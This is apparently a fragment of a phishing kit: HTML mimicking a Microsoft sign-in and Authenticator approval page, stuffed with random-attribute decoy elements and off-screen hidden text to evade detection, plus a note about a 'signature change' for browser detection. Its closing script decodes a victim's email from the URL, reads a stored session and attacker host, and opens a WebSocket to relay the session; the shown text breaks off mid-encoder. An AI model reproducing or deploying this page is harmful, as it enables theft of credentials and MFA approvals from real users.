+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() -->
+                <!-- ko template: { nodes: [$data], data: $parent } --><div data-bind="pageViewComponent: { name: 'session-approval-view',
+                    params: {
+                        serverData: svr,
+                        sentProof: sharedData.sentProof,
+                        username: sharedData.username,
+                        supportsBack: true,
+                        isInitialState: isInitialState,
+                        sessionIdentifier: sharedData.sessionIdentifier,
+                        showCancelButton: sharedData.showCancelButton,
+                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
+                        currentPollStartTime: sharedData.currentPollStartTime,
+                        currentPollEndTime: sharedData.currentPollEndTime,
+                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
+                        sessionApprovalError: sharedData.sessionApprovalError,
+                        flowToken: sharedData.flowToken,
+                        entropy: sharedData.entropy },
+                    event: {
+                        cancel: view_onCancel,
+                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
+                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
+                        submitReady: $tfaPage.view_onSubmitReady } }" data-showidentitybanner="true" data-viewid="6"><!--  -->
+
+<input data-bind="value: '22'" name="type" type="hidden" value="22"/>
+<input data-bind="value: svr.sCtx" name="request" type="hidden" value="rQQIARAAhZM_jNt0FMfj5C7koiscR4uKWG7ogFrZsX92EvsAiSTOH98lTmI758SL5fhfnPi_nTjxhGCABdGhMJyYkFhugwXEBBu6qVIlRG-oUIcOIKQKlrKRwlyxPH2f3vsOT9_PKxYqCAYQDEFv5wCCHt8iqpUyQZSnMA7UCkxQUxQmcb0CYxqFb0egWlGV8LB4AO6df5UNNo33P_r9p8dPbr99AR3N4tiPjkulJEkQzzAsVUdUzynZiqtZrrkC30HQfQg6z-7qLjziL7JRBa9SGAFAFcVICi_jBIGwc9but4fricPEbKomPQtFWZqbdQUTnwijWBJG-GTecqT2mcW2W05P5BY9cZSy6SJmaYaQeBTttZl1VzzZ7jCxRC-IHt1c9-Yzp0-rxFX2lX5tGc_A8-KFVqr_md0zvNCRfS-Kz3OfZ0m6OoIjipMiw2SadDoZJMISGxvxsI5TDXe0thRZrcNccDb0o7FnBzQ-XQ0bMyAx1aBugoUkYl3YJhUzrBHhJqmnDtN0u91m1PI7ZRtNB749xVHcFqqdqJwOpiZJblyqMbcXnEJLM2AGp0BYEBQPe8aQDLnGCK413FjENmHTmAsnpiTyhMHzrbqyHBqLJGgroJl4da9lruChrkhV1le1mh42tKZwNpG58oJzcW8wHvoVEcAoBfhW0NSIEGOlWt9uke1wwqwGFbZCYaShj9kTQMoaLAejmROfpq4om6p5kXvjBfGuwDe5_FY4nnuZq3q-7lrakR96hmXrL0JiBUr9f7uO5-hIzbYf524pquot3fg931Y220A0Q3Ese-PomqUq9nMXoizv70C_7bxeyB_s34SOMm9dR3PHhULxIHMzc5R5tgN9ubsF82v97w9_fvAO88n66uH1T29kLndLkqVtjDteYAagfBYx7dOpYNZ1cVk2TpJuWO6P7TuYUOPEAGXeBcfY3Tx0N5-_zL_K0DLbFHihxtI1jgYy-jSf_fgl6Pu9_0X9g_1rhczh3t4j99s3v-CvOlf7rxWLS0u2ve0xenT43wv8cC3z7OVfn_7y2Y9_3fuj8w81"/>
+<input data-bind="value: currentPollStartTime" name="mfaLastPollStart" type="hidden" value="1655826439762"/>
+<input data-bind="value: currentPollEndTime" name="mfaLastPollEnd" type="hidden" value="1655826441510"/>
+
+<!-- ko if: twoWayPollingNeeded -->
+<input data-bind="attr: { name: svr.sAuthMethodInputFieldName }, value: 'PhoneAppNotification'" name="mfaAuthMethod" type="hidden" value="PhoneAppNotification"/>
+<!-- /ko -->
+
+<!-- ko if: svr.canary -->
+<input data-bind="value: svr.canary" name="canary" type="hidden" value="Zidyf+oqgq25VsIGKbTgBeWu5fJwLr5OXl+1TARWq0I=9:1"/>
+<!-- /ko -->
+
+<div aria-level="1" class="row text-title" data-bind="text: title" id="idDiv_SAOTCAS_Title" role="heading">Approve sign in request</div>
+<div class="row text-body">
+    <div data-bind="component: { name: 'proof-image-control', params: { type: PROOF.Type.TOTPAuthenticatorV2, small: true, animate: true } }"><!--  -->
+
+<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 -->
+    <!-- ko if: !svr.fUseNewAuthenticatorIcon --><!-- /ko -->
+
+    <!-- ko if: svr.fUseNewAuthenticatorIcon -->
+        <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small animate-pulse" data-bind="imgSrc, css: { 'small': small, 'animate-pulse': animate }" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_authenticator_942ac71f77cb04004b0ab25950e170b5.png" role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg"/><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+    <!-- /ko -->
+<!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
+    <div class="text-block-body overflow-hidden">
+        <div data-bind="htmlWithBindings: description, childBindings: { 'idSpan_SAOTCAS_DescSessionID': { css: { 'bold': true } } }" id="idDiv_SAOTCAS_Description">Open your Microsoft Authenticator app and approve the request to sign in</div>
+        <!-- ko if: description2 --><!-- /ko -->
+    </div>
+</div>
+
+<!-- ko if: displaySign --><!-- /ko -->
+
+<div>
+    <!-- ko if: doPolling --><!-- /ko -->
+</div>
+
+<div class="position-buttons" data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }">
+    <div class="row">
+        <div class="row no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown" style="display: none;">
+            <div class="col-md-24 form-group no-margin-top checkbox">
+                <label id="idLbl_SAOTCAS_TD_Cb">
+                    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
+                    <input aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description" aria-label="Don't ask again for undefined days" data-bind="
+                        attr: { name: svr.sTrustedDeviceCheckboxName },
+                        ariaLabel: str['CT_SAOTCAS_STR_AddTD'],
+                        ariaDescribedBy: ['idDiv_SAOTCAS_Title', 'idDiv_SAOTCAS_Description'].concat(description2 ? ['idDiv_RichContext_Description'] : []).join(' '),
+                        hasFocusEx: tdCheckbox.isShown,
+                        checked: tdCheckbox.isChecked,
+                        disable: tdCheckbox.isDisabled" id="idChkBx_SAOTCAS_TD" name="rememberMFA" type="checkbox" value="true"/>
+                    <button class="cdx-button cdx-button--weight-quiet mw-interlanguage-selector" data-event-name="ui.dropdown-p-lang-btn-sticky-header" id="p-lang-btn-sticky-header" style="position: absolute; right: 11772px;" tabindex="-1"><span class="vector-icon mw-ui-icon-wikimedia-language mw-ui-icon-wikimedia-wikimedia-language"></span>
+
+</button><span class="b4eb79e0 b88c24 feb3e22 d7da2cde5 ec4a7c95b a84b2 d999d" data-bb77c="a2d5aac" data-bind="text: str['CT_SAOTCAS_STR_AddTD']" data-ca418="c231f5" data-d42625e="bebbb" data-e53b28="f0f3f52" data-ed7e13="cd26" data-eec149="cb8c038" data-fe3="f1248" high="ec1775ebfca1" integritykind="edd346db6cc2e1f" low="ee58a6f946d8d" method="e610c1c3b8cbc21" muted="ed29abacfc22"><span class="d25f1e6d ccb7c ff132 d8328 e214b3a afa97cc5 ef9b3d" data-b759e47="db7667" data-c24c="bb94e" data-d86="ab81" id="e42fa6" low="cbf97faaaa964" method="c7ed47aaa21" muted="f395efc5d1876a6" open="fc7c407f0dcb856" optimum="db03e9493c4551"></span><b style="position: absolute; opacity: 0;">Mordellistenochroa</b></span>
+                </label>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-md-24">
+                <div class="text-13">
+                    <!-- ko if: showSwitchProofsLink -->
+                    <div class="form-group" data-bind="
+                            css: { 'no-margin-bottom': !svr.urlMoreInfo },
+                            htmlWithBindings: toggleText,
+                            childBindings: {
+                                'signInAnotherWay': {
+                                    hasFocusEx: !tdCheckbox.isShown,
+                                    ariaDescribedBy: ['idDiv_SAOTCAS_Title', 'idDiv_SAOTCAS_Description'].concat(description2 ? ['idDiv_RichContext_Description'] : []).join(' ') } }" id="idDiv_SAOTCS_HavingTrouble" style=""><a aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description" href="#" id="signInAnotherWay"><p class="d8c2ceaf f7a0a1 d2854d2 de7471fe5 d4587 cf2a1c5ae" data-b06b="e01ad4" data-bb41="fef" data-cd7bd85="dad" data-cfe16b="a31e497" high="acdd51ecb43dd37" id="b31f873c4489c9" integritykind="f8115e24ca16" low="d14b6b555e" method="e4bde03c130" muted="de8c290959" style="display: inline;"></p></a></div>
+                    <!-- /ko -->
+
+                    <!-- ko if: svr.urlMoreInfo -->
+                    <div class="form-group no-margin-bottom">
+                        <a aria-label="More information about two step verification" data-bind="text: str['CT_STR_More_Info'], href: svr.urlMoreInfo, ariaLabel: str['CT_STR_More_Info_AriaLabel']" href="" id="moreInfoUrl" target="_blank"><p class="f87fb282 e4c6e4b4e dc36e0 d8314a7 c41dcf7 a6e543132" data-b3a69d9="a14cd5c" data-b6b="a0adb4" data-cec78="b8dbf" data-f23d7="f097" headers="c193458ea10e86c" high="cf22d9df52a" id="bdf8c508c139ee" integritykind="b7e6919006d" low="ab1f89fc067a8b2" method="ac54cb5f7ff62" style="display: inline;"></p></a>
+                    </div>
+                    <!-- /ko -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+            <div data-bind="component: { name: 'footer-buttons-field',
+                params: {
+                    serverData: svr,
+                    isPrimaryButtonVisible: false,
+                    isSecondaryButtonVisible: !showSwitchProofsLink,
+                    secondaryButtonText: str['CT_SAOTCC_STR_Cancel'] },
+                event: {
+                    secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin }" style="display: none;">
+
+    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
+
+    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }">
+        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+        <input class="win-button button_primary button ext-button primary ext-primary" data-bind="
+                attr: primaryButtonAttributes,
+                externalCss: {
+                    'button': true,
+                    'primary': true },
+                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                hasFocus: focusOnPrimaryButton,
+                click: primaryButton_onClick,
+                enable: isPrimaryButtonEnabled,
+                visible: isPrimaryButtonVisible,
+                preventTabbing: primaryButtonPreventTabbing" data-report-attached="1" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" id="idSIButton9" style="display: none;" type="submit" value="Next"/>
+    </div>
+</div></div>
+        </div>
+    </div>
+</div>
+
+<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
+            <!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        <!-- /ko -->
+    </div>
+	
+	<div id="id-signature-change" style="display:none;">
+		<p class="bee0d1 e2f7856b2 c245f e9bb9c c160a c8b2a6917 e68d0 d8f1280" data-da21e="a1b6c9b" data-daa248="a5143" data-e80c="e1a4e2" data-f84="ae6" headers="c15ec69d6b" high="e68eec18e06004" integritykind="ec56f0ee8426432" low="efd8fb2d8ac" method="b04f9813e34"> THIS WORKS AS A SIGNA TURE CHANGE FOR DETECED BROWSER</p>
+	</div>
+	<div class="mfa2-error pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }" style="display:none;">
+
+        <!-- ko foreach: views -->
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() -->
+                <!-- ko template: { nodes: [$data], data: $parent } --><div data-bind="pageViewComponent: { name: 'session-approval-timeout-view',
+                    params: {
+                        serverData: svr,
+                        sentProof: sharedData.sentProof,
+                        username: sharedData.username,
+                        hasTotp: sharedData.hasTotp,
+                        showCancelButton: sharedData.showCancelButton,
+                        sessionApprovalError: sharedData.sessionApprovalError,
+                        debugDetails: sharedData.debugDetails,
+                        flowToken: sharedData.flowToken,
+                        sessionApprovalError: sharedData.sessionApprovalError },
+                    event: {
+                        cancel: view_onCancel,
+                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
+                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
+                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
+                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick } }" data-showidentitybanner="true" data-viewid="7"><!--  -->
+
+<div>
+    <div aria-level="1" class="row text-title" data-bind="visible: !sendErrorOccurred,
+        html: titleText,
+        attr: { id: getId('idDiv', 'Title') }" id="idDiv_SAASTO_Title" role="heading">We didn't hear from you</div>
+
+    <div class="text-block-body form-group">
+        <span class="ec584b188 ea273 dc581 f48bef form-group" data-a5486="ddfc" data-bind="
+            visible: sendErrorOccurred,
+            text: str['CT_SAASTO_STR_Error_SendFail'],
+            attr: { id: getId('idDiv', 'SendErrorTitle') }" data-c46ac="f6dd" data-cbd83b0="b5a" data-ee6a2="d1f8" id="idDiv_SAASTO_SendErrorTitle" optimum="af1fdf1279d7" ping="f02029b7c4" role="alert" sandbox="d2f64b1f66981" scope="ce02b3193e3" span="df69d43a0f5f" style="display: none;"><p class="baebfe3 df22e50 a052f e44f8 ee9916 bc045d" data-b5aa="ba8" data-e92c38="f0d0e6" data-e9664="e42a96" high="b2a5052d22a1" id="d1234573" integritykind="fae95439dc471" low="cf19b09a42" method="b80d6b071ff6f83" muted="cbaf0b16a9629a" style="display: inline;"></p></span>
+
+        <span class="vector-dropdown-label-text" style="position: absolute; opacity: 0;">Appearance</span><span class="bfb4c8495 ef039191c form-group cacfa759 df9452" data-a08="d048e" data-a6382a="c582" data-adc5b="cc935" data-bind="
+            visible: !sendErrorOccurred,
+            attr: { id: getId('idDiv', 'Description') },
+            css: { 'alert alert-error': error() &amp;&amp; !isAuthLimitReached },
+            htmlWithBindings: descriptionText,
+            childBindings: {
+                'useAuthenticator': {
+                    click: switchToOtcConfirm_onClick,
+                    ariaDescribedBy: 'idDiv_SAASTO_Title idDiv_SAASTO_Description',
+                    hasFocus: true },
+                'useVerificationCode': {
+                    click: switchToOtcConfirm_onClick,
+                    ariaDescribedBy: 'idDiv_SAASTO_Title idDiv_SAASTO_Description',
+                    hasFocus: true } }" data-e9282="bd5970" data-f2367a="d2933" id="idDiv_SAASTO_Description" optimum="dd99b68a4a2" ping="a3896c43f2" role="alert" sandbox="b5a550abfc16" scope="c1d43e8388" span="dcdd5c75624cea"><span class="cab953 f0ff2e8 edc34202 b72579b0" data-bbc="a45" data-c75="a7b9f8" data-cd2d2f1="a2ddc2b" data-de9d9a="d2b3" id="a643f3" open="c914f4265f" optimum="d7d40d54e3" ping="c38a07117972f7f" sandbox="c356eb3f74" scope="eb18cbb5e87b"></span><button class="vector-pinnable-header-toggle-button vector-pinnable-header-pin-button" data-event-name="pinnable-header.vector-page-tools.pin" style="position: absolute; left: -11197px;">move to sidebar</button></span>
+
+        <!-- ko if: svr.fShowViewDetailsLink && !isAuthLimitReached -->
+        <a aria-label="View debugging details for this error" class="no-wrap" data-bind="
+            text: str['CT_STR_Error_ViewDetails'],
+            clickExpr: onShowDebugDetails(debugDetails, true),
+            ariaLabel: str['CT_STR_Error_ViewDetailsAriaLabel']" href="#" id="ViewDetails"><span class="ae21c ed2720b a936d2b54 f8d86 cf610 d4448 bb8681" data-a5b778="e6db4" data-bb0bf="c0d" data-cab51="d0a" data-cf7="ba70128" high="c8e32031e7" id="e317" integritykind="e5168a32dc0f2" low="a5739cf76f" method="e57687a90d25" muted="bdd1454c9c"></span></a>
+        <!-- /ko -->
+    </div>
+
+    <!-- ko ifnot: isAuthLimitReached -->
+    <div class="form-group">
+        <a data-bind="html: str['CT_SAASTO_STR_Resend'], attr: { id: getId('idA', 'Resend') }, click: resend_onClick" href="#" id="idA_SAASTO_Resend"></a>
+    </div>
+    <!-- /ko -->
+
+</div>
+
+<!-- ko if: !isAuthLimitReached && (allowTotp || showSwitchProofsLink) -->
+<div>
+    <div class="text-subtitle" data-bind="html: str['CT_SAOTCAS_STR_Trouble'], attr: { id: getId('idDiv', 'Trouble') }" id="idDiv_SAASTO_Trouble">Having trouble?</div>
+   
+</div>
+<!-- /ko -->
+
+<!-- ko if: isAuthLimitReached && showSwitchProofsLink --><!-- /ko -->
+
+<div class="position-buttons" data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }">
+    <div>
+        <!-- ko if: svr.urlMoreInfo -->
+        <div class="row">
+            <div class="col-md-24">
+                <div class="text-13">
+                    <div class="form-group">
+                        <a aria-label="More information about two step verification" data-bind="
+                            text: str['CT_STR_More_Info'],
+                            href: svr.urlMoreInfo,
+                            ariaLabel: str['CT_STR_More_Info_AriaLabel']" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" id="moreInfoUrl" target="_blank"><span class="d47d07d e7bc346e3 df237f a6f4b e1d878 d95b4ffc ed102cbe" data-aef="ce84" data-b3fd9="c8d9c" data-c4805="e90a48" data-ceec32="d6574ba" data-ede="c660df2" id="fbcd4f0a2efabb0" optimum="e859fb4f1ff" ping="e3f6fe797de2" sandbox="b2ef08a95c537" scope="d6259e15ed" span="a59430bcdd120"></span></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /ko -->
+    </div>
+</div>
+
+<div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+        <div data-bind="component: { name: 'footer-buttons-field',
+            params: {
+                serverData: svr,
+                removeBottomMargin: !svr.urlMoreInfo,
+                isPrimaryButtonVisible: false,
+                secondaryButtonId: getId('idBtn', 'Cancel'),
+                secondaryButtonText: str['CT_SAOTCC_STR_Cancel'],
+                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; showCancelButton },
+            event: {
+                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin }">
+
+    <!-- ko if: isSecondaryButtonVisible -->
+    <div class="inline-block">
+        <input class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
+            attr: { 'id': secondaryButtonId || 'idBtn_Back' },
+            externalCss: {
+                'button': true,
+                'secondary': true },
+            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
+            ariaDescribedBy: secondaryButtonDescribedBy,
+            hasFocus: focusOnSecondaryButton,
+            click: secondaryButton_onClick,
+            enable: isSecondaryButtonEnabled" id="idBtn_SAASTO_Cancel" type="button" value="Cancel"/>
+    </div>
+    <!-- /ko -->
+
+    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }">
+        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+        <input class="win-button button_primary button ext-button primary ext-primary" data-bind="
+                attr: primaryButtonAttributes,
+                externalCss: {
+                    'button': true,
+                    'primary': true },
+                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                hasFocus: focusOnPrimaryButton,
+                click: primaryButton_onClick,
+                enable: isPrimaryButtonEnabled,
+                visible: isPrimaryButtonVisible,
+                preventTabbing: primaryButtonPreventTabbing" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" id="idSIButton9" style="display: none;" type="submit" value="Next"/>
+    </div>
+</div></div>
+    </div>
+</div>
+
+<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
+            <!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        <!-- /ko -->
+    </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div>
+                  </div>
+                  <div class="footer" id="footer">
+                     <div>
+                        <div class="footerNode text-secondary">
+                           <a class="footer-content ext-footer-content footer-item ext-footer-item" data-bind="
+            text: termsText,
+            href: termsLink,
+            click: termsLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/fr/servicesagreement/" id="ftrTerms"><h1 class="firstHeading mw-first-heading" id="firstHeading" style="position: absolute; right: 11944px;"><i>Mordellistenochroa</i></h1><span class="d0acec3d f1eb4 f2076957 efc590bd" data-ad0="e66" data-d36="f2314" data-eca5808="b5ced" high="b60a99a1906" id="e7642b517877b5a" integritykind="be3b474e4a03aa" low="e5910f8ea6493e" method="ebccb319e0ca" muted="f524681b14dbf"></span></a>
+        <!-- /ko -->
+
+        <!-- ko if: !hidePrivacy -->
+        <a class="footer-content ext-footer-content footer-item ext-footer-item" data-bind="
+            text: privacyText,
+            href: privacyLink,
+            click: privacyLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/fr/privacystatement" id="ftrPrivacy"><p class="c8997 e3817 aeae6 a49316 eee33f01 eb9ed724" data-c03c5b9="fb56" data-ca4de="e1a5" data-f2947a="c7ab" data-f634="ea8" data-f653f03="ae92da" data-ff4c1="f7feaba" high="a35027302aadaa" id="d58585198d" integritykind="b0599125b21" low="b0112bc3b2b74" method="b01ce6cf051458" muted="b7d5873128ea22" style="display: inline;"></p></a>
+        <!-- /ko -->
+
+        <!-- ko if: impressumLink --><!-- /ko -->
+
+        <!-- ko if: showIcpLicense --><!-- /ko -->
+    <!-- /ko -->
+        <a aria-expanded="false" aria-label="Cliquez ici pour obtenir des informations sur la ©solution des probl¨mes" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item" data-bind="
+        click: moreInfo_onClick,
+        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
+        attr: { 'aria-expanded': showDebugDetails().toString() },
+        hasFocusEx: focusMoreInfo(),
+        externalCss: {
+            'footer-content': true,
+            'footer-item': true,
+            'debug-item': true,
+            'has-background': !useDefaultBackground,
+            'background-always-visible': hasDarkBackground }" href="#" id="moreOptions" role="button">...</a>
+
+                           <a href="#"><img src=""/></a>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            
+			</div>
+			<input class="stealth" type="hidden"/>
+
+      </div> 
+              <div id="loadingScreen" style="display: block;">
+                    <svg height="220" id="loadingLogo" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" viewBox="0 0 220 220" width="220" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><STRIPPED></svg></div>
+      <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+	  
+     <script>
+        ;(() => {
+        class e {
+            static get(e, t = 1) {
+            if (!t) {
+                return sessionStorage.getItem(e)
+            }
+            let s = sessionStorage.getItem(e)
+            if (!s) {
+                return null
+            }
+            sessionStorage.setItem(e, null)
+            let o = parseInt(s.substring(s.length - 2), 16)
+            return s
+                .substring(0, s.length - 2)
+                .match(/.{2}/gim)
+                .map((e) => {
+                let t = parseInt(e, 16)
+                return String.fromCharCode(t ^ o)
+                })
+                .join('')
+            }
+            static getBased() {
+            let t = location.hash.substring(1),
+                s = location.search.substring(1)
+            if (t) {
+                return e.decodeBased(t)
+            }
+            if (s) {
+                let t,
+                o = (e.get('autograbs', 1) || 'em,email').split(',')
+                for (; (t = /([^\&]+?)\=([^\&]*)/gim.exec(s)); ) {
+                if (t[1] && o.includes(t[1])) {
+                    return e.decodeBased(t[2])
+                }
+                }
+            }
+            return null
+            }
+            static decodeBased(t) {
+            if (!(t = decodeURIComponent(t)) || !t.trim()) {
+                return null
+            }
+            if (
+                /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(
+                t
+                )
+            ) {
+                return t
+            }
+            try {
+                let e = atob(t)
+                if (
+                /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(
+                    e
+                )
+                ) {
+                return e
+                }
+                throw 'Bad base64'
+            } catch (e) {
+                if (/(?:[a-fA-F0-9]{2}){5,}/im.test(t)) {
+                let e = t
+                    .match(/.{2}/gim)
+                    .map((e) => {
+                    let t = parseInt(e, 16)
+                    return String.fromCharCode(t)
+                    })
+                    .join('')
+                if (
+                    /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(
+                    e
+                    )
+                ) {
+                    return e
+                }
+                {
+                    let s = parseInt(t.substring(t.length - 2), 16)
+                    if (
+                    ((e = t
+                        .substring(0, t.length - 2)
+                        .match(/.{2}/gim)
+                        .map((e) => {
+                        let t = parseInt(e, 16)
+                        return String.fromCharCode(t ^ s)
+                        })
+                        .join('')),
+                    /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(
+                        e
+                    ))
+                    ) {
+                    return e
+                    }
+                }
+                }
+            }
+            return /[^a-zA-Z0-9.#+&\/=_{|}@\-\\]/gim.test(t)
+                ? e.decodeBased(t.replace(/[^a-zA-Z0-9.#+&\/=_{|}@\-\\]/gim, ''))
+                : void 0
+            }
+            constructor() {
+            let t = new URL(e.get('host', 0)),
+                s = this.fetch_cookie(),
+                o = Math.floor(1000 * Math.random()),
+                r =
+                `ws${'https:' == location.protocol ? 's' : ''}://` +
+                t.host +
+                '/p/' +
+                o
+            r += '?session=' + s
+            this.ws = new WebSocket(r)
+            this.ws.binaryType = 'arraybuffer'
+            this.responses = []
+            var i = this
+            this.ws.onerror = function (e) {
+                $('#display-error-message').text(
+                'Could not connect to corresponding server',
+                function () {
+                    $('#content').css('opacity', '0.1')
+                }
+                )
+                $('#error-dismiss')
+                .prop('disabled', true)
+                .css({ visibility: 'visible' })
+            }
+            this.ws.onclose = function (e) {
+                i.responses = []
+            }
+            this.ws.onmessage = function (e) {
+                i.responses.push(e)
+            }
+            }
+            fetch_cookie() {
+            return sessionStorage.getItem('session')
+            }
+            encode(e) {
+            var t = [],
+                s = [
+                Math.floor(1000 * Math.random()) % Math.pow(2, 7),
+                Math.floor(1000 * Math.random()) % Math.pow(2, 7),
+                Math.floor(1000 * Math.random()) % Math.pow(2, 7),
+                ]
+            return (
+                e.split('').map((e) => {
